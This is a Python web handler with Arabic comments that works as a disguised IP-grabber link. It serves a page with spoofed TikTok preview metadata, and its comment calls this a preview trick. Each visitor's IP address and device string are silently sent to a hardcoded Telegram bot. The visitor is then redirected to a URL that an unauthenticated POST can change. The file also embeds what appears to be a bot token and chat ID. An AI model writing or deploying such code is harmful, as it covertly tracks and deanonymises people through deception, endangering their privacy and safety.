from http.server import BaseHTTPRequestHandler
import json
import urllib.request

# بياناتك الثابتة
TOKEN = "7161793392:AAH9fN6X0L-yG03E9W7z3_hL6N0"
ID = "6198462719"

# تخزين الرابط
db = {"url": "https://vt.tiktok.com/"}

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        data = json.loads(self.rfile.read(content_length))
        db["url"] = data.get("url")
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        # سحب المعلومات
        ip = self.headers.get('x-forwarded-for', self.client_address[0])
        ua = self.headers.get('User-Agent', 'Unknown')
        
        # إرسال البيانات للتليجرام (استخدام urllib لضمان العمل بدون مشاكل مكتبات)
        try:
            text = f"🛰️ Radar Log:\nIP: {ip}\nDevice: {ua}"
            api_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={urllib.parse.quote(text)}"
            urllib.request.urlopen(api_url)
        except:
            pass

        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        
        # هنا خدعة المعاينة: الرابط سيظهر كأنه تيك توك عند الإرسال
        target = db["url"]
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>TikTok</title>
            <meta property="og:title" content="TikTok - شاهد الفيديو">
            <meta property="og:image" content="https://www.tiktok.com/favicon.ico">
            <meta property="og:description" content="اضغط لمشاهدة المقطع الممتع">
            <meta name="twitter:card" content="summary_large_image">
            <script>
                // تحويل سريع جداً
                window.location.replace("{target}");
            </script>
        </head>
        <body style="background:black;"></body>
        </html>
        """
        self.wfile.write(html.encode())
